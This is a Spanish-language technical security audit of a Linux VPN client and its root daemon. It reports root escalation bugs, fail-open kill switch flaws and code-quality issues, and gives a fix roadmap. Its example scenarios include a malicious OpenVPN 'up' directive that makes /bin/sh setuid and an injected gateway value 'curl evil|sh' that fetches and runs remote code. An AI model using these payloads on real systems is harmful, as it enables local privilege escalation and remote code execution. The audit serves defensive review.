# Auditoría Técnica Integral — VPN Manager

> **Metodología.** Se leyó de primera mano la columna vertebral (entrypoints, protocolo IPC, frontera de privilegios daemon↔cliente, systemd, packaging) y se desplegaron 5 auditores en paralelo por subsistema (UI, motores VPN + daemon privilegiado, internals core, trust, seguridad adversarial). **Se verificó contra el código real cada CRITICAL/HIGH reportado.** Donde un subagente sobre-severizó, se bajó la severidad y se explica. Los hallazgos descartados están al final con su razón.

---

## 1. Resumen Ejecutivo

VPN Manager es un cliente VPN de escritorio para Linux (GTK4/libadwaita) **maduro y bien organizado**: ~38k LOC de producción + ~7.7k de tests, arquitectura de separación de privilegios (GUI sin privilegios ↔ daemon root por socket Unix + JSON-RPC 2.0), CI serio (race detector, coverage, CodeQL, govulncheck, license check), packaging deb/rpm/apt, CHANGELOG en v2.2.2. El autor es claramente competente y con conciencia de seguridad.

**Pero** — y esto es lo crítico de cara a escalar a "miles de usuarios" — la **frontera de privilegios, que es el corazón de la propuesta de valor ("enterprise-grade security"), está rota**. Hay tres caminos independientes de **escalada local a root** verificados en código:

1. **Ejecución de config arbitraria como root** — el daemon corre `openvpn --config <ruta del cliente>` y `wg-quick up <ruta>` validando solo que el archivo *exista*. Las directivas `up`/`PostUp`/`script-security` ejecutan shell como root.
2. **Inyección de comandos vía `bash -c`** en el split-tunneling per-app, con campos del cliente interpolados sin validar.
3. **Autorización inservible** — socket `0666` + política "cualquier `uid≥1000`", sin autorización por método. Cualquier proceso del usuario logueado (un `npm install` malicioso, una pestaña de navegador comprometida) controla el daemon root.

El resto del sistema tiene deuda técnica normal en su mayoría: buenos patrones (lifecycle de procesos OpenVPN, marshaling GTK en los caminos principales, validación correcta en `gateway.go`), y problemas acotados (freezes de UI por I/O en el hilo principal, código muerto, escrituras no atómicas, algún data race menor).

**Veredicto:** Buen proyecto con un **agujero de seguridad sistémico en su núcleo de privilegios** que debe corregirse ANTES de cualquier crecimiento. Causa raíz única: **toda la validación vive en el lado cliente (sin privilegios) y el daemon root confía ciegamente en lo que recibe.**

---

## 2. Comprensión General del Sistema

**Dos binarios, un socket:**

```
vpn-manager (GUI, usuario)                    vpn-managerd (root, systemd)
  pkg/ui/*  ──┐                          ┌──  daemon/server.go (acceptLoop)
  internal/vpn/* (clientes)  JSON-RPC 2.0 │    daemon/privileged/* (handlers)
              └──> pkg/protocol/client ───┴──> exec: iptables/nft/wg/openvpn/
                   socket Unix newline-delimited      tailscale/sysctl/ip
```

**Flujo de una conexión (WireGuard):**
1. UI (`pkg/ui/panels/wireguard/actions.go`) invoca el `vpn.Manager` (`internal/vpn/manager.go`).
2. El provider cliente (`internal/vpn/wireguard/provider.go`) valida/importa el `.conf` y llama al cliente RPC (`internal/daemon/clients.go`).
3. El cliente serializa `wireguard.connect{configPath,...}` y lo manda por el socket (`pkg/protocol/client.go`).
4. El daemon (`daemon/server.go:283`) lee, autoriza vía SO_PEERCRED, y despacha al handler (`daemon/privileged/handlers.go`).
5. El handler root ejecuta `ip link add` / `wg setconf` / `wg-quick up` (`daemon/privileged/vpn/wireguard.go`).

**Componentes principales:**
- **Protocolo** (`pkg/protocol`): JSON-RPC 2.0 newline-delimited, codec con mutex read/write separados. Correcto y limpio.
- **Daemon** (`daemon/`): registry de handlers, timeouts por método, tracking de clientes, `State` compartido, broadcast de eventos.
- **Motores VPN** (`internal/vpn/`): OpenVPN, WireGuard, Tailscale (con Taildrop, exit nodes, LAN gateway).
- **Seguridad** (`internal/vpn/security` cliente + `daemon/privileged/firewall` root): kill switch, DNS leak protection, IPv6 protection — **dos mitades del mismo flujo, no duplicación muerta**.
- **Trust** (`internal/vpn/trust`): auto-conexión por clasificación de red (D-Bus/NetworkManager → debounce → evaluación de reglas → acción VPN), con detección de "evil twin" (SSID+BSSID).
- **Soporte**: eventbus (backbone de eventos), resilience (circuit breaker/retry/safego), logger, config, keyring, stats (SQLite), health (probes TCP/ICMP/HTTP), network quality.

**Comunicación inter-módulo:** el `eventbus` (`internal/eventbus/eventbus.go`) es el bus interno del proceso GUI (usado por app.go, tray.go, manager.go, connection.go, trust/*). El socket JSON-RPC es la frontera GUI↔root. El daemon puede empujar eventos a clientes vía `BroadcastEvent` (`daemon/server.go:372`).

---

## 3. Fortalezas

- **Arquitectura de separación de privilegios**: la decisión de fondo es correcta y bien ejecutada estructuralmente. GUI sin privilegios, daemon root, IPC tipado.
- **Lifecycle de procesos OpenVPN** (`daemon/privileged/vpn/openvpn.go:203-235`): mutex por proceso, `sync.Once` en `stopChan`, kill por PID (evita `killall`, bug ya corregido en el CHANGELOG), limpieza del cred file en todos los caminos de error.
- **Patrón de validación correcto en `daemon/privileged/firewall/gateway.go:44-49`**: `isValidInterfaceName` + `isValidCIDR`. Es el modelo a portar a TODOS los handlers.
- **Marshaling GTK disciplinado** en los caminos principales: 63 sitios de `glib.IdleAdd`, tickers de panel correctos en OpenVPN/WireGuard.
- **DNS path de NetworkManager** (`internal/vpn/security/dns.go:271-306`): valida IPs y usa escritura atómica temp+rename+fsync — el patrón correcto que falta en otros lados.
- **Madurez de ingeniería**: CI con `-race`, coverage a Codecov, CodeQL + govulncheck + license check, SECURITY.md, CONTRIBUTING, conventional commits, hardening en el unit systemd.
- **`safego`** (`internal/resilience/safego.go`) usado consistentemente (22 archivos) para recuperar panics en goroutines.

---

## 4. Debilidades

- **Toda la validación de entrada vive en el cliente sin privilegios** y el daemon confía ciegamente. Es la causa raíz de los 3 críticos.
- **Controles de seguridad fail-open**: kill switch e IPv6 protection reportan éxito aunque las reglas no se apliquen.
- **Sin límites de recursos** en el daemon: tamaño de mensaje ilimitado, conexiones ilimitadas, sin rate limit.
- **I/O bloqueante en el hilo principal de GTK** en 3 lugares → freezes de hasta ~30s.
- **Duplicación triplicada** en los 3 paneles VPN y 3 diálogos de diagnóstico; un helper de "dedupe" que nadie usa.
- **Escrituras no atómicas** de config y perfiles (riesgo de corrupción por interrupción).
- **Código muerto** disperso (helpers de errors.go, ExecuteScript, varias funciones de UI).
- **Cobertura de tests desigual**: el código MÁS crítico (firewall root, 1175 LOC) es el MENOS testeado (188 LOC de test).

---

## 5. Problemas Críticos 🔴

> Los tres son **escalada local a root** y se combinan: el #3 abre la puerta, el #1 y #2 dan RCE.

### C1 — RCE root vía `config_path`/directivas no validadas (OpenVPN + WireGuard)
**Evidencia (verificada de primera mano):** `daemon/privileged/vpn/openvpn.go:112-124` solo hace `os.Stat` de existencia y ejecuta `openvpn --config <params.ConfigPath>`. Igual `wg-quick up <configPath>` en `wireguard.go:263`. **Grep confirmado: el daemon NO filtra `script-security`, `up`, `PostUp` en ningún lado.** El filtro de directivas peligrosas existe SOLO en el cliente (`internal/vpn/profile/profile.go:365`), trivialmente evitable por un atacante que hable directo al socket.
**Escenario:** cliente escribe `evil.ovpn` con `script-security 2` + `up "/bin/sh -c 'chmod u+s /bin/sh'"`, llama `openvpn.connect{config_path:"/home/atk/evil.ovpn"}` → root ejecuta el script.

### C2 — Inyección de comandos vía `bash -c` (split-tunnel per-app)
**Evidencia (verificada):** `daemon/privileged/apptunnel/apptunnel.go:280` `exec.Command("bash", "-c", script)` donde `script` se construye con `fmt.Fprintf` interpolando `m.vpnGateway`, `m.systemDNS`, `m.vpnDNS`, `m.cgroupPath` — todos poblados desde el JSON del cliente por `TunnelSetupHandler` **sin validación**. Un `vpn_gateway = "1.1.1.1; curl evil|sh #"` → RCE root.

### C3 — Autorización inservible: socket `0666` + `uid≥1000`, sin autz por método
**Evidencia (verificada):** `daemon/server.go:130` `os.Chmod(socketPath, 0666)` y `server.go:341-350` `isAuthorized` ignora el parámetro `method` y devuelve `true` para todo `uid≥1000`. **Cualquier proceso del usuario logueado** (npm/pip postinstall, navegador comprometido, cron) puede invocar `killswitch.enable`, `openvpn.connect`, etc. No hay allowlist del binario GUI, ni token de sesión, ni polkit por operación. El CHANGELOG v2.2.2 dice haber arreglado el "auth bypass", pero **el arreglo es parcial**: distingue "usuario regular vs servicio", no "el dueño de la sesión vs cualquier otro proceso".

---

## 6. Problemas Importantes 🟡 (HIGH)

- **Kill switch fail-open** (`daemon/privileged/firewall/killswitch.go`): las reglas se agregan y el hook a OUTPUT se hace *último* (:165); si algo previo falla, retorna error **sin rollback** y el tráfico fluye sin filtrar mientras el usuario cree que falló. Un control de seguridad DEBE fail-closed.
- **IPv6 protection fail-open** (`ipv6.go:44-62`): ignora todos los errores de sysctl/nft/ip6tables y `return nil` siempre → fuga IPv6 silenciosa con falsa confianza.
- **Sin validación de IP/CIDR/iface en la frontera** (killswitch/dns/ipv6): un `LANRange=0.0.0.0/0` convierte el kill switch en no-op; un valor con `-` inicial se inyecta como flag de iptables/resolvectl.
- **`ReadBytes('\n')` sin límite** (`pkg/protocol/rpc.go:86`) (verificado): un cliente manda una línea de GBs sin `\n` → OOM del daemon root.
- **Sin límite de conexiones ni rate limit** (`daemon/server.go:179-238`) (verificado): agotamiento de goroutines/FDs/memoria.
- **Auth key de Tailscale en argv** (`tailscale.go:111`): visible en `/proc/<pid>/cmdline` para cualquier usuario local.
- **Taildrop `SendFile` sin validar path/target** (`tailscale.go:391`): el daemon root puede exfiltrar cualquier archivo legible por root a un tailnet atacante.
- **UI — I/O bloqueante en el hilo GTK**: cerrar Preferences aplica settings de Tailscale con 3 shell-outs de 10s → **freeze de ~30s sin spinner** (`preferences.go:111`); panel Tailscale hace `Status()` síncrono cada 5s (`panels/tailscale/state.go:79`).
- **UI — mutación GTK cross-thread** (`tailscale_diagnostics.go:135`) (verificado, con comentario que lo admite): data race real; los hermanos OpenVPN/WG lo hacen bien con `IdleAdd`.
- **UI — leaks de goroutine/ticker**: `monitorConnection` sin stop channel (`profile_list.go:608`); pollers corriendo mientras está minimizado en tray (`window.go:68`).

---

## 7. Problemas Menores 🟢 (MEDIUM/LOW seleccionados)

- **Escrituras no atómicas** (verificado, sin `os.Rename`/`CreateTemp`) en `config.go` y `profile.go:182` → corrupción si se interrumpe.
- **Data race sobre `matchedRule.LastMatched`** (`trust/manager.go:122`): escrito bajo lock, leído sin lock en el coordinator. *(Bajado de "CRITICAL use-after-free" del subagente: Go tiene GC, no hay UAF; es un data race real pero benigno — MEDIUM.)*
- **Keyring fallback con password hardcodeado** (`keyring.go:100`): `"vpn-manager-local-storage"` + salt junto al cifrado.
- **Paths `/tmp` predecibles usados por root** (`paths.go:41`): `resolv.conf.backup` → ataque de symlink.
- **OpenVPN sobrevive al contexto del request** (`openvpn.go:98`): timeout devuelve error pero deja procesos root sin trackear; `waitForProcess` borra del mapa por clave, no por identidad (`:396`).
- **Sin locking en las mutaciones de cadenas iptables/nft del daemon** → RPCs concurrentes se pisan.
- **Validación de perfil evitable en `Update()`** (`profile.go`); detección de OTP/directivas por `strings.Contains` frágil (falsos positivos en comentarios).
- **shutdown.go**: goroutines huérfanas si un hook excede el timeout (`shutdown.go:309`).
- **I/O bajo lock** en `trust/coordinator.SetEnabled` (`coordinator.go`); `nmcli` sin timeout (`trust/monitor.go`).
- **UI — errores tragados**: fallos de WireGuard solo notifican si `ShowNotifications` está on (`panels/wireguard/panel.go:210`); "Settings saved" aunque el apply del daemon falle (`preferences.go:645`); errores de file-dialog tratados como cancelación.
- **Charts no theme-aware** (`graph.go:147`): colores RGBA hardcodeados; `UpdateColors` ignora su argumento y es código muerto.

---

## 8. Código Innecesario (eliminable sin afectar funcionamiento)

**Verificado (0 usos en producción):**
- **Helpers de `internal/errors/errors.go`**: `IsNetworkError`, `IsAuthError`, `IsRecoverable`, `IsRetryable`, `GetSuggestedAction`, `NewRecoverableError`, `NewCriticalError`, `WrapWithCode` — 0 archivos de producción. ~40% del paquete es API muerta.
- **`ExecuteScript`** en `firewall/gateway.go:252` — sin callers. Sink latente de `bash` como root; **eliminar**.
- **`ErrProfileNotFound` duplicado** en `profile.go:23` y `errors.go:257` — dos definiciones del mismo error lógico.
- **UI**: `common.FormatBytesCompact`, `graph.UpdateColors/SetMaxValue/SetAutoScale`, `weekly_chart.FormatDataSummary/GetTotalDownload/GetTotalUpload`, `diagnostics.RunProbeAsync`, `preferences.validateCustomDNSEntry`, `split_tunnel_helpers.go` entero (CreateRouteRow/CreateAppRow/etc. — el helper anti-duplicación que nadie usa mientras los diálogos reimplementan inline).
- **`noSessionPage`** (`stats/layout.go:164`): se construye pero nunca se hace `Append` — empty state huérfano.
- **Comentarios de tickets obsoletos** (`Task 4.3`, `Task 3.6`...) dispersos.

---

## 9. Complejidad Innecesaria

- **eventbus (599 líneas)**: *NO es código muerto* (lo usa app.go, tray.go, manager.go, connection.go, trust/*), pero probablemente **sobre-equipado** — múltiples modos de entrega (sync/async/channel/priority) donde el uso real es un puñado de tipos de evento. Simplificar a los modos efectivamente usados.
- **Taxonomía de errores** (31 códigos, 6 categorías, helpers) para ~4-5 códigos usados. Reducir a lo que se consume.
- **Trust: 3 clases con 3 mutexes** (Monitor/Manager/Coordinator) con locking cruzado propenso a errores. Un `TrustSystem` único simplificaría el razonamiento de concurrencia.
- **UI god-objects**: `MainWindow` (16 campos, 805 líneas mezclando layout/acciones/toasts/tray/PanelHost), `tray.go` (1005), `preferences.go` (861), `profile_list.go` (867 con 2 diálogos modales embebidos que deberían vivir en `dialogs/`).

---

## 10. Mejoras Arquitectónicas

1. **Mover TODA la validación a la frontera de privilegios** (daemon), no al cliente. El cliente puede validar para UX, pero el daemon **debe** revalidar todo lo que ejecuta.
2. **Fuente única de verdad para constantes** compartidas (nombres de cadenas iptables/nft, rangos LAN) — hoy redefinidas en cliente y daemon → drift silencioso en detección de estado.
3. **Segregar `ports.PanelHost`** (`ports/interfaces.go`): hoy expone `*vpn.Manager` y `*config.Config` concretos → el "puerto" institucionaliza su propio bypass. Interfaces estrechas por capacidad.
4. **Base real de diagnósticos**: un `DiagnosticsView` que posea `RunProbes([]probeFn)` con entrega vía `IdleAdd` y `ConnectClosed→cancelFunc`. Elimina C1-UI, H4, H7 de una.
5. **Componentes de panel compartidos**: `ConnectButtonState`, `ProfileRowBuilder`, `PanelScaffold` — mata la triplicación de los 3 paneles.

---

## 11. Mejoras de Rendimiento

**Backend:**
- Cachear `distro.Detect()` (relee `/etc/os-release` cada llamada).
- `stats/repository.go` (915 líneas, SQLite): auditar retención/crecimiento no acotado, índices y posibles N+1 (**pendiente de revisión dedicada**).
- Health/network monitoring: revisar intervalos de polling agregados (WireGuard 2s + Tailscale 5s + stats + trust) — en batería suman.

**Frontend:**
- Sacar I/O del hilo GTK (los 3 freezes) — mayor ganancia percibida.
- **Pausar pollers al minimizar** a tray (`window.go:68`) — hoy siguen haciendo shell-outs cada pocos segundos indefinidamente.
- Cairo: `graph.go:242 draw` hace `GetAll()` dos veces por frame; `weekly_chart.go:190` re-ejecuta `SelectFontFace` dentro del loop de 7 barras.

---

## 12. Mejoras de Seguridad (checklist priorizado)

1. 🔴 **Contener `config_path`** a un directorio root-only, revalidar propiedad, forzar `--script-security 0`, rechazar `up/down/route-up/PostUp/PostDown`.
2. 🔴 **Eliminar `bash -c`** en apptunnel → `exec.Command("iptables", args...)` por regla, sin interpolación de shell.
3. 🔴 **Autorización real**: socket `0660 root:<grupo-desktop>` (o credencial de sesión) + tabla de política por método. Dejar de asumir `uid≥1000 == GUI`.
4. 🟡 **Fail-closed** en kill switch e IPv6: montar reglas, verificar que la política DROP quedó, hookear atómicamente, y ante error tear-down a estado bloqueante.
5. 🟡 **Acotar el cable**: `io.LimitReader`/buffer máximo, tope de conexiones y rate limit por UID.
6. 🟡 **Secretos fuera de argv/logs**: auth key de Tailscale por file/stdin; redactar `Output` antes de devolver/loguear.
7. 🟡 **Portar validación de Taildrop al daemon** (`SendFile`), y state-dir root-only (hoy `MkdirAll 0755`).
8. 🟢 Keyring fallback: derivar de secreto real (o exigir keyring del sistema).

---

## 13. Mejoras de UI

- **Consistencia de estados del botón Connect**: hoy 3 implementaciones divergentes (OpenVPN 4 estados, WireGuard 3 sin error, **Tailscale sin spinner**). Unificar.
- **Iconos de tray faltantes**: solo connected/disconnected; falta connecting/error aunque los paneles ya modelan esos estados.
- **Charts theme-aware de verdad** (seguir el accent del sistema).
- **Escala de spacing/radius** centralizada (hoy magic numbers `12/24` repetidos; 3 vocabularios de clases CSS para indicadores up/down).
- **Un solo formateador de bytes** (`FormatBytes` `1.2GB` vs `FormatBytesCompact` `1.2 GB` renderizan distinto entre paneles).

---

## 14. Mejoras de UX

- **Feedback en operaciones largas**: spinners donde hoy hay freeze (Preferences save, panel Tailscale).
- **No mentir con "Settings saved"** cuando el apply del daemon falló (`preferences.go:645`).
- **Errores visibles siempre** (no solo si las notificaciones están activas): fallos de import/connect/delete de WireGuard hoy pueden ser invisibles.
- **Empty state de "No Active Session"** que efectivamente se renderice (hoy huérfano).
- **Diferenciar "sin datos" de "calidad mediocre"**: la barra de calidad arranca en 50/"Unknown" sin monitor → se lee como mediocre.
- **Auto-colapsar filas al desconectar** (hoy siguen mostrando `--`).

---

## 15. Mejoras de Mantenibilidad

- **Subir cobertura donde importa**: `daemon/privileged/firewall` tiene 1175 LOC src / **188 test** — el código root más peligroso es el menos testeado. Tests de tabla para validación de entrada y fail-closed.
- **Eliminar código muerto** (sección 8) — reduce superficie de mantenimiento y confusión.
- **Romper god-objects** (window/tray/preferences/profile_list) en unidades cohesivas.
- **Fuente única de constantes** cliente/daemon.
- **Documentar el contrato de thread-safety** real del `PanelHost` (hoy el comentario miente: dice "thread-safe" pero `SetStatus`/`ShowToast` tocan widgets sin `IdleAdd`).

---

## 16. Refactorizaciones Recomendadas

| Área | Acción | Motivo |
|---|---|---|
| Frontera daemon | Middleware de validación por handler (IP/CIDR/iface/path) | Cierra C1-C3 y HIGHs de firewall |
| apptunnel | Reescribir `runScript` a argv-form por regla | Elimina `bash -c` |
| Diagnósticos UI | `DiagnosticsView` base con probes+IdleAdd+cancel | Elimina 3 bugs de una |
| Paneles VPN | Extraer `ProfileRowBuilder`/`ConnectButtonState`/`PanelScaffold` | Mata triplicación |
| errors.go | Podar a lo usado; unificar `ErrProfileNotFound` | Código muerto |
| eventbus | Reducir a modos de entrega usados | Complejidad |
| Escrituras | Helper `atomicWriteFile` (temp+rename+fsync) | Corrupción |

---

## 17. Priorización

**🔴 Alta (bloqueante para escalar):** C1, C2, C3 (RCE root × autz rota); fail-open de kill switch e IPv6; validación en la frontera; límites de recursos del daemon (ReadBytes + conexiones); auth key en argv; Taildrop SendFile.

**🟡 Media:** freezes de UI (I/O en hilo GTK); leaks de goroutine/ticker UI; escrituras no atómicas; data race `LastMatched`; keyring hardcodeado; `/tmp` predecible; procesos OpenVPN sin trackear; locking en firewall; cobertura de tests en firewall.

**🟢 Baja:** código muerto; complejidad de eventbus/errors/trust; consistencia UI/UX; charts theme-aware; caching de distro; comentarios obsoletos.

---

## 18. Plan de Acción (Roadmap)

**Fase 0 — Contención de seguridad (1-2 semanas, antes de cualquier release nuevo):**
1. Validación obligatoria en cada handler del daemon (IP/CIDR/iface/path con leading-`-` rejection).
2. Contener `config_path` + `--script-security 0` + rechazo de directivas de script.
3. Reescribir apptunnel a argv-form.
4. Socket `0660` + autz por método.
5. Límites: tamaño de mensaje + conexiones + rate limit.

**Fase 1 — Robustez de controles (2-3 semanas):**
6. Fail-closed en kill switch e IPv6 (montar → verificar → hookear atómico → tear-down bloqueante ante error).
7. Secretos fuera de argv/logs; state-dir root-only; Taildrop validado en daemon.
8. Suite de tests de tabla para el firewall (subir cobertura del 16% actual).

**Fase 2 — Calidad UI/DX (2-4 semanas):**
9. Sacar I/O del hilo GTK + pausar pollers al minimizar + arreglar leaks de goroutine.
10. `DiagnosticsView` base + componentes de panel compartidos.
11. Podar código muerto + romper god-objects.

**Fase 3 — Deuda y consistencia (continuo):**
12. Unificar constantes cliente/daemon; simplificar eventbus/errors; escrituras atómicas; consistencia UI/UX.

---

## Anexo — Hallazgos de subagentes DESCARTADOS o BAJADOS tras verificar

| Hallazgo del subagente | Severidad reclamada | Veredicto tras leer el código | Razón |
|---|---|---|---|
| eventbus/resilience "código muerto, 0 consumidores" | HIGH | **FALSO** | eventbus usado en 6 archivos prod; resilience en manager.go |
| `Retry` "ignora contexto, usa time.Sleep" | MED/HIGH | **FALSO** | `resilience.go:219` tiene `case <-ctx.Done()` |
| Trust "double-close de stopChan → panic" | CRITICAL | **LOW** | `Stop()` tiene guard `if !nm.running` bajo lock (`monitor.go:127`) |
| Trust "goroutine leak en fallo D-Bus" | HIGH | **LOW** | `listenLoop` solo arranca si `!dbusFailed` (`monitor.go:116`) |
| Trust "signalChan nunca cerrado → cuelga" | HIGH | **LOW** | `listenLoop` sale por `case <-nm.stopChan` (`monitor.go:209`) |
| Trust "rule pointer → use-after-free" | CRITICAL | **MEDIUM** | Go tiene GC; es data race real sobre `LastMatched`, no UAF |
| errors "codeToCategory: `AUT` nunca matchea" | LOW (bug) | **DESCARTADO** | `"AUTH-001"[:3]=="AUT"` matchea `case "AUT"` — funciona |
| logger "CheckRotation race" | CRITICAL | **LOW/MED** | Secciones bajo lock; peor caso una línea perdida en reapertura |
